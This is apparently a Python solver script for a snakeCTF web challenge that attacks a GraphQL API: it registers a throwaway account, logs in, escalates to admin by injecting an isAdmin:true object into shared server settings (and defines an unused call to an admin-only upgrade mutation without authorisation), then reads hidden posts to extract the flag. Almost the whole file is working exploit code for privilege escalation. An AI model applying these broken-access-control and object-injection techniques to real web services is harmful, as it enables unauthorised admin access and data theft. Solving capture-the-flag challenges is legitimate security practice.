#!/usr/bin/env python3

import requests
import json
import random
import urllib3
import string
import sys
import re
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld")
    exit(1)

url = sys.argv[1]
GRAPHQL_URL = f"{url}/api/graphql"

def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def execute_graphql(query, variables=None, headers=None):
    payload = {'query': query}
    if variables:
        payload['variables'] = variables
    
    try:
        response = requests.post(GRAPHQL_URL, json=payload, headers=headers, timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        return None

def step_1_signup(username, password):
    mutation = """
    mutation Signup($username: String!, $password: String!) {
      signup(username: $username, password: $password)
    }
    """
    variables = {"username": username, "password": password}
    result = execute_graphql(mutation, variables)
    if result and "errors" not in result:
        return True
    else:
        return False

def step_2_login(username, password):
    mutation = """
    mutation Login($username: String!, $password: String!) {
      login(username: $username, password: $password)
    }
    """
    variables = {"username": username, "password": password}
    result = execute_graphql(mutation, variables)
    if result and "data" in result and result["data"]["login"]:
        token = result["data"]["login"]
        return token
    else:
        return None

def step_3_exploit_broken_access_control(token):
    headers = {"Authorization": token}
    # Any valid upgrade ID will work. We'll use "1" for "VIB".
    upgrade_id = "1"
    
    mutation = """
    mutation AdminUserUpgrade($upgradeId: ID!) {
      adminUserUpgrade(upgradeId: $upgradeId) {
        id
        upgrades { id }
      }
    }
    """
    variables = {"upgradeId": upgrade_id}
    result = execute_graphql(mutation, variables, headers=headers)
    
    if result and "data" in result and result["data"]["adminUserUpgrade"]:
        return True
    else:
        return False

def step_4_exploit_object_injection(token):
    headers = {"Authorization": token}
    # This payload injects isAdmin:true into the shared server-side settings object.
    malicious_settings = json.dumps({"isAdmin": True})
    
    mutation = """
    mutation UpdateSettings($settings: String!) {
      updateSettings(settings: $settings)
    }
    """
    variables = {"settings": malicious_settings}
    
    result = execute_graphql(mutation, variables, headers=headers)
    if result and "errors" not in result:
        return True
    else:
        return False

def step_5_find_the_flag(token):
    headers = {"Authorization": token}
    query = """
    query HiddenPosts {
      hiddenPosts {
        id
        title
        content
      }
    }
    """
    result = execute_graphql(query, headers=headers)
    if result and "data" in result and "hiddenPosts" in result["data"]:
        
        flag_found = False
        for post in result["data"]["hiddenPosts"]:
            # A simple check for a typical CTF flag format
            content_lower = post["content"].lower()
            if "snake" in content_lower or "flag" in content_lower:
                match = re.search(r"snakeCTF\{.*?\}", post['content'])
                flag = match.group(0)
                print(flag)
                flag_found = True
                break

if __name__ == "__main__":
    # Generate a unique user for this run
    USERNAME = f"solver_{generate_random_string()}"
    PASSWORD = generate_random_string()

    if not step_1_signup(USERNAME, PASSWORD):
        sys.exit(1)
        
    token = step_2_login(USERNAME, PASSWORD)
    
    if token:
        if step_4_exploit_object_injection(token):
            step_5_find_the_flag(token)